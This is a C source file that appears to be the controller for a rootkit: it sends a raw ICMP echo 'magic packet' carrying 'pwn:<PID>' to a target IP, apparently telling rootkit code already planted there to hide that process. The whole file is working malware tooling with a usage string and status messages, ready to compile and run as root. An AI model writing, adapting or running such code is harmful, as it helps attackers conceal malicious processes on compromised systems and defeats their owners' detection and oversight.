#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Target IP> <PID to Hide>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *pid_to_hide = argv[2];
    
    char payload[32];
    sprintf(payload, "pwn:%s", pid_to_hide); 
    int payload_len = strlen(payload);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket Error (Run as sudo?)");
        return 1;
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    char packet[1024];
    memset(packet, 0, sizeof(packet));

    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO; 
    icmp->code = 0;
    icmp->un.echo.id = 0;
    icmp->un.echo.sequence = 0;
    
    memcpy(packet + sizeof(struct icmphdr), payload, payload_len);

    icmp->checksum = checksum(packet, sizeof(struct icmphdr) + payload_len);

    int bytes = sendto(sockfd, packet, sizeof(struct icmphdr) + payload_len, 0,
                       (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if (bytes > 0) {
        printf("[+] Magic Packet sent to %s! Command: %s\n", target_ip, payload);
    } else {
        perror("Send failed");
    }

    close(sockfd);
    return 0;
}